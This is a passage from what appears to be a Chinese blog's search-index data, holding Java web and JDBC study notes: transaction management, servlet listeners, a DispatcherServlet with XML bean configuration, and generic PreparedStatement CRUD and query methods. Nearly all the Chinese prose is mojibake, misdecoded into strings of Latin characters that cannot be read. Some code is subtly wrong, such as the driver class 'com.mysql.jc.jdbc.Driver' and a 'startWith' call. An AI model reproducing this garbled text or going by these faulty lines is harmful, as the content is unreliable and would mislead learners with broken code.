å€ŸåŠ©sql.connection,å®ç°å¯¹æ•´ä¸ªäº‹åŠ¡çš„ç®¡ç†ï¼Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class TransactionManager { public TransactionManager() { } public static void beginTrans() throws SQLException { ConnUtil.getConn().setAutoCommit(false); } public static void commit() throws SQLException { Connection conn = ConnUtil.getConn(); conn.commit(); ConnUtil.closeConn(); } public static void rollback() throws SQLException { Connection conn = ConnUtil.getConn(); conn.rollback(); ConnUtil.closeConn(); } } 2.5 ç›‘å¬å™¨ ç›‘å¬äº‹ä»¶çš„è¿‡ç¨‹ ServletContextListener - ç›‘å¬ServletContextå¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯çš„è¿‡ç¨‹ HttpSessionListener - ç›‘å¬HttpSessionå¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯çš„è¿‡ç¨‹ ServletRequestListener - ç›‘å¬ServletRequestå¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯çš„è¿‡ç¨‹ ServletContextAttributeListener - ç›‘å¬ServletContextçš„ä¿å­˜ä½œç”¨åŸŸçš„æ”¹åŠ¨(add,remove,replace) HttpSessionAttributeListener - ç›‘å¬HttpSessionçš„ä¿å­˜ä½œç”¨åŸŸçš„æ”¹åŠ¨(add,remove,replace) ServletRequestAttributeListener - ç›‘å¬ServletRequestçš„ä¿å­˜ä½œç”¨åŸŸçš„æ”¹åŠ¨(add,remove,replace) HttpSessionBindingListener - ç›‘å¬æŸä¸ªå¯¹è±¡åœ¨SessionåŸŸä¸­çš„åˆ›å»ºä¸ç§»é™¤ HttpSessionActivationListener - ç›‘å¬æŸä¸ªå¯¹è±¡åœ¨SessionåŸŸä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ– 2.6 ä¸­å¤®æ§åˆ¶å™¨ DispatcherServletè¿™ä¸ªç±»çš„å·¥ä½œåˆ†ä¸ºä¸¤å¤§éƒ¨åˆ†ï¼š\næ ¹æ®urlå®šä½åˆ°èƒ½å¤Ÿå¤„ç†è¿™ä¸ªè¯·æ±‚çš„controllerç»„ä»¶ï¼š\nä»urlä¸­æå–servletPath : å°†è·å¾—çš„urlè¿›è¡Œå¤„ç†ï¼Œè·å¾—æˆ‘ä»¬åœ¨beanFactoryä¸­ç»„è£…å¥½çš„Controllerå¯¹è±¡åç§°ã€‚\næ ¹æ®åç§°æ‰¾åˆ°å¯¹åº”çš„ç»„ä»¶:xxxController ï¼Œ è¿™ä¸ªå¯¹åº”çš„ä¾æ®æˆ‘ä»¬å­˜å‚¨åœ¨applicationContext.xmlä¸­\n1 \u0026lt;bean id=\u0026#34;fruit\u0026#34; class=\u0026#34;com.atguigu.fruit.controllers.FruitController/\u0026gt; é€šè¿‡DOMæŠ€æœ¯æˆ‘ä»¬å»è§£æXMLæ–‡ä»¶ï¼Œåœ¨ä¸­å¤®æ§åˆ¶å™¨ä¸­å½¢æˆä¸€ä¸ªbeanMapå®¹å™¨ï¼Œç”¨æ¥å­˜æ”¾æ‰€æœ‰çš„Controllerç»„ä»¶\næ ¹æ®è·å–åˆ°çš„operateçš„å€¼å®šä½åˆ°æˆ‘ä»¬FruitControllerä¸­éœ€è¦è°ƒç”¨çš„æ–¹æ³•\nè°ƒç”¨Controllerç»„ä»¶ä¸­çš„æ–¹æ³•ï¼š\nè·å–å‚æ•°\nè·å–å³å°†è¦è°ƒç”¨çš„æ–¹æ³•çš„å‚æ•°ç­¾åä¿¡æ¯: Parameter[] parameters = method.getParameters();\né€šè¿‡parameter.getName()è·å–å‚æ•°çš„åç§°ï¼›\nå‡†å¤‡äº†Object[] parameterValues è¿™ä¸ªæ•°ç»„ç”¨æ¥å­˜æ”¾å¯¹åº”å‚æ•°çš„å‚æ•°å€¼ å¦å¤–ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘å‚æ•°çš„ç±»å‹é—®é¢˜ï¼Œéœ€è¦åšç±»å‹è½¬åŒ–çš„å·¥ä½œã€‚é€šè¿‡parameter.getType()è·å–å‚æ•°çš„ç±»å‹\næ‰§è¡Œæ–¹æ³• Object returnObj = method.invoke(controllerBean , parameterValues);\nè§†å›¾å¤„ç†\n1 2 3 4 String returnStr = (String)returnObj; if(returnStr.startWith(\u0026#34;redirect:\u0026#34;)){ .... }else if..... è¿™é‡Œç»™å‡ºapplicationContext.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE beans[ \u0026lt;!ELEMENT beans (bean*)\u0026gt; \u0026lt;!ELEMENT bean (property*)\u0026gt; \u0026lt;!ELEMENT property (#PCDATA)\u0026gt; \u0026lt;!ATTLIST bean id ID #REQUIRED\u0026gt; \u0026lt;!ATTLIST bean class CDATA #IMPLIED\u0026gt; \u0026lt;!ATTLIST property name CDATA #IMPLIED\u0026gt; \u0026lt;!ATTLIST property ref IDREF #IMPLIED\u0026gt; ]\u0026gt; \u0026lt;!-- ä¸Šé¢çš„æ˜¯ è¦æ±‚äº†\u0026lt;bean \u0026gt; å’Œ \u0026lt;property\u0026gt; çš„æ ¼å¼--\u0026gt; \u0026lt;beans\u0026gt; \u0026lt;bean id = \u0026#34;userBasicDAO\u0026#34; class = \u0026#34;com.reus.qqzone.dao.impl.UserBasicDAOImpl\u0026#34;/\u0026gt; \u0026lt;bean id = \u0026#34;userBasicService\u0026#34; class = \u0026#34;com.reus.qqzone.service.impl.UserBasicServiceImpl\u0026#34;\u0026gt; \u0026lt;property name = \u0026#34;userBasicDAO\u0026#34; ref=\u0026#34;userBasicDAO\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;!-- user.do --\u0026gt; \u0026lt;bean id = \u0026#34;user\u0026#34; class =\u0026#34;com.reus.qqzone.controller.UserController\u0026#34;\u0026gt; \u0026lt;property name = \u0026#34;userBasicService\u0026#34; ref = \u0026#34;userBasicService\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 0x03 ä¸šåŠ¡ è®¾è®¡ä¸šåŠ¡çš„æ—¶å€™ï¼Œéœ€è¦å…ˆæ„æƒ³å¥½æ•°æ®åº“ã€åŠæ•°æ®åº“ä¹‹é—´çš„ä¾èµ–å…³ç³»ã€‚\nDAOçš„æ¦‚å¿µå’Œè§’è‰²ï¼ˆè®¾è®¡ç†å¿µï¼‰ï¼š DAO-ç§°ä¹‹ä¸ºæ•°æ®è®¿é—®å¯¹è±¡ï¼Œå…¶ä¸­çš„æ–¹æ³•éƒ½æ˜¯å•ç²¾åº¦æ–¹æ³•ã€‚\nä»€ä¹ˆå«å•ç²¾åº¦ï¼Œå•ç²¾åº¦æŒ‡çš„æ˜¯è¿™ä¸ªæ–¹æ³•çš„ç²’åº¦ä¸èƒ½å†åˆ†äº†ï¼Œå·²ç»éå¸¸ç»†äº†ï¼ˆå› æ­¤ä¹Ÿç§°ä¹‹ä¸ºç»†ç²’åº¦ï¼‰ ä»€ä¹ˆæ˜¯ä¸šåŠ¡å±‚\nModel1å’ŒModel2 MVC : Modelï¼ˆæ¨¡å‹ï¼‰ã€Viewï¼ˆè§†å›¾ï¼‰ã€Controllerï¼ˆæ§åˆ¶å™¨ï¼‰ è§†å›¾å±‚ï¼šç”¨äºåšæ•°æ®å±•ç¤ºä»¥åŠå’Œç”¨æˆ·äº¤äº’çš„ä¸€ä¸ªç•Œé¢ æ§åˆ¶å±‚ï¼šèƒ½å¤Ÿæ¥å—å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå…·ä½“çš„ä¸šåŠ¡åŠŸèƒ½è¿˜æ˜¯éœ€è¦å€ŸåŠ©äºæ¨¡å‹ç»„ä»¶æ¥å®Œæˆ æ¨¡å‹å±‚ï¼šæ¨¡å‹åˆ†ä¸ºå¾ˆå¤šç§ï¼šæœ‰æ¯”è¾ƒç®€å•çš„pojo/vo(value object)ï¼Œæœ‰ä¸šåŠ¡æ¨¡å‹ç»„ä»¶ï¼Œæœ‰æ•°æ®è®¿é—®å±‚ç»„ä»¶ pojo/vo :ç±»å¯¹è±¡ DAO ï¼š æ•°æ®è®¿é—®å¯¹è±¡ BO ï¼š ä¸šåŠ¡å¯¹è±¡(è¿™é‡Œå³ä¸ºService) åŒºåˆ†ä¸šåŠ¡å¯¹è±¡å’Œæ•°æ®è®¿é—®å¯¹è±¡ï¼š DAOä¸­çš„æ–¹æ³•éƒ½æ˜¯å•ç²¾åº¦æ–¹æ³•æˆ–è€…ç§°ä¹‹ä¸ºç»†ç²’åº¦æ–¹æ³•ã€‚ä»€ä¹ˆå«å•ç²¾åº¦ï¼Ÿä¸€ä¸ªæ–¹æ³•åªè€ƒè™‘ä¸€ä¸ªæ“ä½œï¼Œæ¯”å¦‚å¢åˆ æ”¹æŸ¥ BOä¸­çš„æ–¹æ³•å±äºä¸šåŠ¡æ–¹æ³•ï¼Œä¹Ÿå®é™…çš„ä¸šåŠ¡æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œå› æ­¤ä¸šåŠ¡æ–¹æ³•çš„ç²’åº¦æ˜¯æ¯”è¾ƒç²—çš„ é’ˆå¯¹ä¸€ä¸ªç”¨æˆ·çš„æ“ä½œï¼šæˆ‘ä»¬å¯ä»¥å¯¹ç”¨æˆ·çš„ç™»å½•ã€æ³¨å†Œã€æŸ¥çœ‹ä¸ªäººä¿¡æ¯ã€æ³¨é”€ã€æ›´æ”¹ä¿¡æ¯ï¼Œè¿™äº›è¦æ±‚é›†åˆæˆä¸€ä¸ªcontroller\ncontrollerä¸­è°ƒç”¨service å±‚ï¼Œåœ¨serviceå±‚å®ç°ç™»å½•ã€æ³¨å†Œç­‰çš„ä¸šåŠ¡ã€‚ åŒæ—¶å‘¢ï¼Œserviceå€Ÿç”¨daoå±‚çš„åŸºç¡€æ•°æ®åº“ä¸ºåº•å±‚ã€‚ ","permalink":"http://www.reus09.top/posts/tech/javaweb/","summary":"0x01 Tomcatä½¿ç”¨ 1.1 Tomcatè®¾ç½®ç¼–ç  Tomcatè®¾ç½®ç¼–ç  tomcat8ä¹‹å‰ï¼Œè®¾ç½®ç¼–ç ï¼š getè¯·æ±‚æ–¹å¼ï¼š getæ–¹å¼ç›®å‰ä¸éœ€è¦è®¾ç½®ç¼–ç ï¼ˆåŸºäº","title":"Javaweb"},{"content":"ä¸€ï¼šJDBCæ¦‚è¿° 1.1 æ•°æ®çš„æŒä¹…åŒ– æŒä¹…åŒ–(persistence)ï¼šæŠŠæ•°æ®ä¿å­˜åˆ°å¯æ‰ç”µå¼å­˜å‚¨è®¾å¤‡ä¸­ä»¥ä¾›ä¹‹åä½¿ç”¨ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç‰¹åˆ«æ˜¯ä¼ä¸šçº§åº”ç”¨ï¼Œæ•°æ®æŒä¹…åŒ–æ„å‘³ç€å°†å†…å­˜ä¸­çš„æ•°æ®ä¿å­˜åˆ°ç¡¬ç›˜ä¸ŠåŠ ä»¥â€å›ºåŒ–â€ï¼Œè€ŒæŒä¹…åŒ–çš„å®ç°è¿‡ç¨‹å¤§å¤šé€šè¿‡å„ç§å…³ç³»æ•°æ®åº“æ¥å®Œæˆã€‚\næŒä¹…åŒ–çš„ä¸»è¦åº”ç”¨æ˜¯å°†å†…å­˜ä¸­çš„æ•°æ®å­˜å‚¨åœ¨å…³ç³»å‹æ•°æ®åº“ä¸­ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å­˜å‚¨åœ¨ç£ç›˜æ–‡ä»¶ã€XMLæ•°æ®æ–‡ä»¶ä¸­ã€‚\n1.2 JDBCç¨‹åºç¼–å†™æ­¥éª¤ æ€»ç»“ä¸€ä¸‹JDBCå»ºç«‹è¿æ¥çš„å…¨è¿‡ç¨‹ã€‚ äºŒï¼šè·å–æ•°æ®åº“è¿æ¥ 2.1 Driveræ¥å£å®ç°ç±» 2.1.1 Driveræ¥å£ä»‹ç» java.sql.Driver æ¥å£æ˜¯æ‰€æœ‰ JDBC é©±åŠ¨ç¨‹åºéœ€è¦å®ç°çš„æ¥å£ã€‚è¿™ä¸ªæ¥å£æ˜¯æä¾›ç»™æ•°æ®åº“å‚å•†ä½¿ç”¨çš„ï¼Œä¸åŒæ•°æ®åº“å‚å•†æä¾›ä¸åŒçš„å®ç°ã€‚\nåœ¨ç¨‹åºä¸­ä¸éœ€è¦ç›´æ¥å»è®¿é—®å®ç°äº† Driver æ¥å£çš„ç±»ï¼Œè€Œæ˜¯ç”±é©±åŠ¨ç¨‹åºç®¡ç†å™¨ç±»(java.sql.DriverManager)å»è°ƒç”¨è¿™äº›Driverå®ç°ã€‚\nmySqlçš„é©±åŠ¨ï¼šcom.mysql.cj.jdbc.Driver ,æœ€æ–°ç‰ˆçš„é©±åŠ¨å·²æ›´åä¸ºæ­¤ã€‚ è¿™é‡Œè®²ä¸€ä¸‹IDEA å¦‚ä½•å¯¼å…¥mysqlè¿æ¥åº“\næ‰“å¼€Project Structureæ¨¡å—\nç„¶åæŒ‰ç…§å¦‚å›¾æ‰€ç¤ºç‚¹å‡»ï¼Œå³å¯æ·»åŠ jaråŒ…åˆ°é¡¹ç›®è·¯å¾„\n2.1.2 åŠ è½½ä¸æ³¨å†ŒJDBCé©±åŠ¨ åŠ è½½é©±åŠ¨ï¼šåŠ è½½ JDBC é©±åŠ¨éœ€è°ƒç”¨ Class ç±»çš„é™æ€æ–¹æ³• forName()ï¼Œå‘å…¶ä¼ é€’è¦åŠ è½½çš„ JDBC é©±åŠ¨çš„ç±»å\nClass.forName(â€œcom.mysql.cj.jdbc.Driverâ€); æ³¨å†Œé©±åŠ¨ï¼šDriverManager ç±»æ˜¯é©±åŠ¨ç¨‹åºç®¡ç†å™¨ç±»ï¼Œè´Ÿè´£ç®¡ç†é©±åŠ¨ç¨‹åº\nä½¿ç”¨DriverManager.registerDriver(com.mysql.jc.jdbc.Driver)æ¥æ³¨å†Œé©±åŠ¨\né€šå¸¸ä¸ç”¨æ˜¾å¼è°ƒç”¨ DriverManager ç±»çš„ registerDriver() æ–¹æ³•æ¥æ³¨å†Œé©±åŠ¨ç¨‹åºç±»çš„å®ä¾‹ï¼Œå› ä¸º Driver æ¥å£çš„é©±åŠ¨ç¨‹åºç±»éƒ½åŒ…å«äº†é™æ€ä»£ç å—ï¼Œåœ¨è¿™ä¸ªé™æ€ä»£ç å—ä¸­ï¼Œä¼šè°ƒç”¨ DriverManager.registerDriver() æ–¹æ³•æ¥æ³¨å†Œè‡ªèº«çš„ä¸€ä¸ªå®ä¾‹ã€‚ä¸‹å›¾æ˜¯MySQLçš„Driverå®ç°ç±»çš„æºç ï¼š\n2.2 URL JDBC URL ç”¨äºæ ‡è¯†ä¸€ä¸ªè¢«æ³¨å†Œçš„é©±åŠ¨ç¨‹åºï¼Œé©±åŠ¨ç¨‹åºç®¡ç†å™¨é€šè¿‡è¿™ä¸ª URL é€‰æ‹©æ­£ç¡®çš„é©±åŠ¨ç¨‹åºï¼Œä»è€Œå»ºç«‹åˆ°æ•°æ®åº“çš„è¿æ¥ã€‚\nä¸¾ä¾‹ï¼š\nè¿™é‡Œæ³¨æ˜ï¼šåœ¨MySQL 8ç‰ˆæœ¬ä»¥ä¸Šçš„urlè¿æ¥éœ€è¦åŠ ä¸Šæ—¶åŒº\njdbc:mysql://localhost:3306/test?serverTimezone=UTC\n2.4 æ•°æ®åº“è¿æ¥æ–¹å¼ è¿æ¥æ–¹å¼äº” 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @Test public void testConnection5() throws Exception { //1.åŠ è½½é…ç½®æ–‡ä»¶ InputStream is = ConnectionTest.class.getClassLoader().getResourceAsStream(\u0026#34;jdbc.properties\u0026#34;); Properties pros = new Properties(); pros.load(is); //2.è¯»å–é…ç½®ä¿¡æ¯ String user = pros.getProperty(\u0026#34;user\u0026#34;); String password = pros.getProperty(\u0026#34;password\u0026#34;); String url = pros.getProperty(\u0026#34;url\u0026#34;); String driverClass = pros.getProperty(\u0026#34;driverClass\u0026#34;); //3.åŠ è½½é©±åŠ¨ Class.forName(driverClass); //4.è·å–è¿æ¥ Connection conn = DriverManager.getConnection(url,user,password); System.out.println(conn); } å…¶ä¸­ï¼Œé…ç½®æ–‡ä»¶å£°æ˜åœ¨å·¥ç¨‹çš„srcç›®å½•ä¸‹ï¼šjdbc.properties\n1 2 3 4 user=root password=abc123 url=jdbc:mysql://localhost:3306/test?serverTimezone=UTC driverClass=com.mysql.jc.jdbc.Driver è¯´æ˜ï¼šä½¿ç”¨é…ç½®æ–‡ä»¶çš„æ–¹å¼ä¿å­˜é…ç½®ä¿¡æ¯ï¼Œåœ¨ä»£ç ä¸­åŠ è½½é…ç½®æ–‡ä»¶\nä½¿ç”¨é…ç½®æ–‡ä»¶çš„å¥½å¤„ï¼š\nâ‘ å®ç°äº†ä»£ç å’Œæ•°æ®çš„åˆ†ç¦»ï¼Œå¦‚æœéœ€è¦ä¿®æ”¹é…ç½®ä¿¡æ¯ï¼Œç›´æ¥åœ¨é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ï¼Œä¸éœ€è¦æ·±å…¥ä»£ç  â‘¡å¦‚æœä¿®æ”¹äº†é…ç½®ä¿¡æ¯ï¼Œçœå»é‡æ–°ç¼–è¯‘çš„è¿‡ç¨‹ã€‚\nä¸‰ï¼šä½¿ç”¨PreparedStatementå®ç°CRUDæ“ä½œ 3.1 æ“ä½œå’Œè®¿é—®æ•°æ®åº“ æ•°æ®åº“è¿æ¥è¢«ç”¨äºå‘æ•°æ®åº“æœåŠ¡å™¨å‘é€å‘½ä»¤å’Œ SQL è¯­å¥ï¼Œå¹¶æ¥å—æ•°æ®åº“æœåŠ¡å™¨è¿”å›çš„ç»“æœã€‚å…¶å®ä¸€ä¸ªæ•°æ®åº“è¿æ¥å°±æ˜¯ä¸€ä¸ªSocketè¿æ¥ã€‚\nåœ¨ java.sql åŒ…ä¸­æœ‰ 3 ä¸ªæ¥å£åˆ†åˆ«å®šä¹‰äº†å¯¹æ•°æ®åº“çš„è°ƒç”¨çš„ä¸åŒæ–¹å¼ï¼š\nStatementï¼šç”¨äºæ‰§è¡Œé™æ€ SQL è¯­å¥å¹¶è¿”å›å®ƒæ‰€ç”Ÿæˆç»“æœçš„å¯¹è±¡ã€‚ PrepatedStatementï¼šSQL è¯­å¥è¢«é¢„ç¼–è¯‘å¹¶å­˜å‚¨åœ¨æ­¤å¯¹è±¡ä¸­ï¼Œå¯ä»¥ä½¿ç”¨æ­¤å¯¹è±¡å¤šæ¬¡é«˜æ•ˆåœ°æ‰§è¡Œè¯¥è¯­å¥ã€‚ CallableStatementï¼šç”¨äºæ‰§è¡Œ SQL å­˜å‚¨è¿‡ç¨‹ å¯¹äº Java è€Œè¨€ï¼Œè¦é˜²èŒƒ SQL æ³¨å…¥ï¼Œåªè¦ç”¨ PreparedStatement(ä»Statementæ‰©å±•è€Œæ¥) å–ä»£ Statement å°±å¯ä»¥äº†ã€‚\n3.2 PreparedStatementçš„ä½¿ç”¨ 3.2.1 PreparedStatementä»‹ç» PreparedStatement æ¥å£æ˜¯ Statement çš„å­æ¥å£ï¼Œå®ƒè¡¨ç¤ºä¸€æ¡é¢„ç¼–è¯‘è¿‡çš„ SQL è¯­å¥\nPreparedStatement å¯¹è±¡æ‰€ä»£è¡¨çš„ SQL è¯­å¥ä¸­çš„å‚æ•°ç”¨é—®å·(?)æ¥è¡¨ç¤ºï¼Œè°ƒç”¨ PreparedStatement å¯¹è±¡çš„ setXxx() æ–¹æ³•æ¥è®¾ç½®è¿™äº›å‚æ•°. setXxx() æ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦è®¾ç½®çš„ SQL è¯­å¥ä¸­çš„å‚æ•°çš„ç´¢å¼•(ä» 1 å¼€å§‹)ï¼Œç¬¬äºŒä¸ªæ˜¯è®¾ç½®çš„ SQL è¯­å¥ä¸­çš„å‚æ•°çš„å€¼\n3.2.2 PreparedStatement vs Statement ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚\nPreparedStatement èƒ½æœ€å¤§å¯èƒ½æé«˜æ€§èƒ½ï¼š\nDBServerä¼šå¯¹é¢„ç¼–è¯‘è¯­å¥æä¾›æ€§èƒ½ä¼˜åŒ–ã€‚å› ä¸ºé¢„ç¼–è¯‘è¯­å¥æœ‰å¯èƒ½è¢«é‡å¤è°ƒç”¨ï¼Œæ‰€ä»¥è¯­å¥åœ¨è¢«DBServerçš„ç¼–è¯‘å™¨ç¼–è¯‘åçš„æ‰§è¡Œä»£ç è¢«ç¼“å­˜ä¸‹æ¥ï¼Œé‚£ä¹ˆä¸‹æ¬¡è°ƒç”¨æ—¶åªè¦æ˜¯ç›¸åŒçš„é¢„ç¼–è¯‘è¯­å¥å°±ä¸éœ€è¦ç¼–è¯‘ï¼Œåªè¦å°†å‚æ•°ç›´æ¥ä¼ å…¥ç¼–è¯‘è¿‡çš„è¯­å¥æ‰§è¡Œä»£ç ä¸­å°±ä¼šå¾—åˆ°æ‰§è¡Œã€‚ åœ¨statementè¯­å¥ä¸­,å³ä½¿æ˜¯ç›¸åŒæ“ä½œä½†å› ä¸ºæ•°æ®å†…å®¹ä¸ä¸€æ ·,æ‰€ä»¥æ•´ä¸ªè¯­å¥æœ¬èº«ä¸èƒ½åŒ¹é…,æ²¡æœ‰ç¼“å­˜è¯­å¥çš„æ„ä¹‰.äº‹å®æ˜¯æ²¡æœ‰æ•°æ®åº“ä¼šå¯¹æ™®é€šè¯­å¥ç¼–è¯‘åçš„æ‰§è¡Œä»£ç ç¼“å­˜ã€‚è¿™æ ·æ¯æ‰§è¡Œä¸€æ¬¡éƒ½è¦å¯¹ä¼ å…¥çš„è¯­å¥ç¼–è¯‘ä¸€æ¬¡ã€‚ (è¯­æ³•æ£€æŸ¥ï¼Œè¯­ä¹‰æ£€æŸ¥ï¼Œç¿»è¯‘æˆäºŒè¿›åˆ¶å‘½ä»¤ï¼Œç¼“å­˜) å¯¹äº Java è€Œè¨€ï¼Œè¦é˜²èŒƒ SQL æ³¨å…¥ï¼Œåªè¦ç”¨ PreparedStatement(ä»Statementæ‰©å±•è€Œæ¥) å–ä»£ Statement å°±å¯ä»¥äº†ã€‚\n3.2.3 Javaä¸SQLå¯¹åº”æ•°æ®ç±»å‹è½¬æ¢è¡¨ Javaç±»å‹ SQLç±»å‹ boolean BIT byte TINYINT short SMALLINT int INTEGER long BIGINT String CHAR,VARCHAR,LONGVARCHAR byte array BINARY , VAR BINARY java.sql.Date DATE java.sql.Time TIME java.sql.Timestamp TIMESTAMP 3.2.4 ä½¿ç”¨PreparedStatementå®ç°å¢ã€åˆ ã€æ”¹æ“ä½œ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 //é€šç”¨çš„å¢ã€åˆ ã€æ”¹æ“ä½œï¼ˆä½“ç°ä¸€ï¼šå¢ã€åˆ ã€æ”¹ ï¼› ä½“ç°äºŒï¼šé’ˆå¯¹äºä¸åŒçš„è¡¨ï¼‰ public void update(String sql,Object ... args){ Connection conn = null; PreparedStatement ps = null; try { //1.è·å–æ•°æ®åº“çš„è¿æ¥ conn = JDBCUtils.getConnection(); //2.è·å–PreparedStatementçš„å®ä¾‹ (æˆ–ï¼šé¢„ç¼–è¯‘sqlè¯­å¥) ps = conn.prepareStatement(sql); //3.å¡«å……å ä½ç¬¦ for(int i = 0;i \u0026lt; args.length;i++){ ps.setObject(i + 1, args[i]); } //4.æ‰§è¡Œsqlè¯­å¥ ps.execute(); } catch (Exception e) { e.printStackTrace(); }finally{ //5.å…³é—­èµ„æº JDBCUtils.closeResource(conn, ps); } } 3.2.5 ä½¿ç”¨PreparedStatementå®ç°æŸ¥è¯¢æ“ä½œ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 // é€šç”¨çš„é’ˆå¯¹äºä¸åŒè¡¨çš„æŸ¥è¯¢:è¿”å›ä¸€ä¸ªå¯¹è±¡ (version 1.0) public \u0026lt;T\u0026gt; T getInstance(Class\u0026lt;T\u0026gt; clazz, String sql, Object... args) { Connection conn = null; PreparedStatement ps = null; ResultSet rs = null; try { // 1.è·å–æ•°æ®åº“è¿æ¥ conn = JDBCUtils.getConnection(); // 2.é¢„ç¼–è¯‘sqlè¯­å¥ï¼Œå¾—åˆ°PreparedStatementå¯¹è±¡ ps = conn.prepareStatement(sql); // 3.å¡«å……å ä½ç¬¦ for (int i = 0; i \u0026lt; args.length; i++) { ps.setObject(i + 1, args[i]); } // 4.æ‰§è¡ŒexecuteQuery(),å¾—åˆ°ç»“æœé›†ï¼šResultSet rs = ps.executeQuery(); // 5.å¾—åˆ°ç»“æœé›†çš„å…ƒæ•°æ®ï¼šResultSetMetaData ResultSetMetaData rsmd = rs.getMetaData(); // 6.1é€šè¿‡ResultSetMetaDataå¾—åˆ°columnCount,columnLabelï¼›é€šè¿‡ResultSetå¾—åˆ°åˆ—å€¼ int columnCount = rsmd.getColumnCount(); if (rs.next()) { T t = clazz.newInstance(); for (int i = 0; i \u0026lt; columnCount; i++) {// éå†æ¯ä¸€ä¸ªåˆ— // è·å–åˆ—å€¼ Object columnVal = rs.getObject(i + 1); // è·å–åˆ—çš„åˆ«å:åˆ—çš„åˆ«åï¼Œä½¿ç”¨ç±»çš„å±æ€§åå……å½“ String columnLabel = rsmd.getColumnLabel(i + 1); // 6.2ä½¿ç”¨åå°„ï¼Œç»™å¯¹è±¡çš„ç›¸åº”å±æ€§èµ‹å€¼ Field field = clazz.getDeclaredField(columnLabel); field.setAccessible(true); field.set(t, columnVal); } return t; } } catch (Exception e) { e.printStackTrace(); } finally { // 7.å…³é—­èµ„æº JDBCUtils.closeResource(conn, ps, rs); } return null; } 3.3 ResultSetä¸ResultSetMetaData 3.3.1 ResultSet æŸ¥è¯¢éœ€è¦è°ƒç”¨PreparedStatement çš„ executeQuery() æ–¹æ³•ï¼ŒæŸ¥è¯¢ç»“æœæ˜¯ä¸€ä¸ªResultSet å¯¹è±¡\nResultSet å¯¹è±¡ä»¥é€»è¾‘è¡¨æ ¼çš„å½¢å¼å°è£…äº†æ‰§è¡Œæ•°æ®åº“æ“ä½œçš„ç»“æœé›†ï¼ŒResultSet æ¥å£ç”±æ•°æ®åº“å‚å•†æä¾›å®ç°\nResultSet è¿”å›çš„å®é™…ä¸Šå°±æ˜¯ä¸€å¼ æ•°æ®è¡¨ã€‚æœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘æ•°æ®è¡¨çš„ç¬¬ä¸€æ¡è®°å½•çš„å‰é¢ã€‚\nResultSet å¯¹è±¡ç»´æŠ¤äº†ä¸€ä¸ªæŒ‡å‘å½“å‰æ•°æ®è¡Œçš„æ¸¸æ ‡ï¼Œåˆå§‹çš„æ—¶å€™ï¼Œæ¸¸æ ‡åœ¨ç¬¬ä¸€è¡Œä¹‹å‰ï¼Œå¯ä»¥é€šè¿‡ ResultSet å¯¹è±¡çš„ next() æ–¹æ³•ç§»åŠ¨åˆ°ä¸‹ä¸€è¡Œã€‚è°ƒç”¨ next()æ–¹æ³•æ£€æµ‹ä¸‹ä¸€è¡Œæ˜¯å¦æœ‰æ•ˆã€‚è‹¥æœ‰æ•ˆï¼Œè¯¥æ–¹æ³•è¿”å› trueï¼Œä¸”æŒ‡é’ˆä¸‹ç§»ã€‚ç›¸å½“äºIteratorå¯¹è±¡çš„ hasNext() å’Œ next() æ–¹æ³•çš„ç»“åˆä½“ã€‚\nå½“æŒ‡é’ˆæŒ‡å‘ä¸€è¡Œæ—¶, å¯ä»¥é€šè¿‡è°ƒç”¨ getXxx(int index) æˆ– getXxx(int columnName) è·å–æ¯ä¸€åˆ—çš„å€¼ã€‚\nä¾‹å¦‚: getInt(1), getString(\u0026ldquo;name\u0026rdquo;) æ³¨æ„ï¼šJavaä¸æ•°æ®åº“äº¤äº’æ¶‰åŠåˆ°çš„ç›¸å…³Java APIä¸­çš„ç´¢å¼•éƒ½ä»1å¼€å§‹ã€‚ ResultSet æ¥å£çš„å¸¸ç”¨æ–¹æ³•ï¼š\nboolean next() getString() 3.3.2 ResultSetMetaData å¯ç”¨äºè·å–å…³äº ResultSet å¯¹è±¡ä¸­åˆ—çš„ç±»å‹å’Œå±æ€§ä¿¡æ¯çš„å¯¹è±¡\nResultSetMetaData meta = rs.getMetaData();\ngetColumnName(int column)ï¼šè·å–æŒ‡å®šåˆ—çš„åç§°\ngetColumnLabel(int column)ï¼šè·å–æŒ‡å®šåˆ—çš„åˆ«å\ngetColumnCount()ï¼šè¿”å›å½“å‰ ResultSet å¯¹è±¡ä¸­çš„åˆ—æ•°ã€‚\ngetColumnTypeName(int column)ï¼šæ£€ç´¢æŒ‡å®šåˆ—çš„æ•°æ®åº“ç‰¹å®šçš„ç±»å‹åç§°ã€‚\ngetColumnDisplaySize(int column)ï¼šæŒ‡ç¤ºæŒ‡å®šåˆ—çš„æœ€å¤§æ ‡å‡†å®½åº¦ï¼Œä»¥å­—ç¬¦ä¸ºå•ä½ã€‚\nisNullable(int column)ï¼šæŒ‡ç¤ºæŒ‡å®šåˆ—ä¸­çš„å€¼æ˜¯å¦å¯ä»¥ä¸º nullã€‚\nisAutoIncrement(int 